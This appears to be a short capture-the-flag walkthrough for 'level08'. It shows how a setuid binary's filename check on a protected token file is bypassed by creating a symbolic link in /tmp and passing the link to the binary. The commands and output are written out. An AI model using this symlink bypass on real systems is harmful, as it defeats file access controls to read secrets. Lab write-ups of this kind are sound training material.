# Level08
## Step by step
### 1. Locate files in `level08` home directory
  ```bash
  > ls
  -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
  -rw-------  1 flag08  flag08    26 Mar  5  2016 token
  ```
---

### 2. Analyze the `level08` binary
The `level08` binary takes a file path as an argument. If the file path is not `token`, it prints the content of the specified file to stdout.

However, we want to read the `token` file, which is restricted by the program's logic.

---

### 3. Create a symbolic link to bypass the restriction
We can create a symbolic link pointing to the `token` file, using a different name that is not restricted by the binary's logic.

  ```bash
  > ln -s $PWD/token /tmp/test
  > ls
  lrwxrwxrwx 1 level08 level08 24 Jan 19 17:19 /tmp/test -> /home/user/level08/token
  > ./level08 /tmp/test
  XXX
  ```
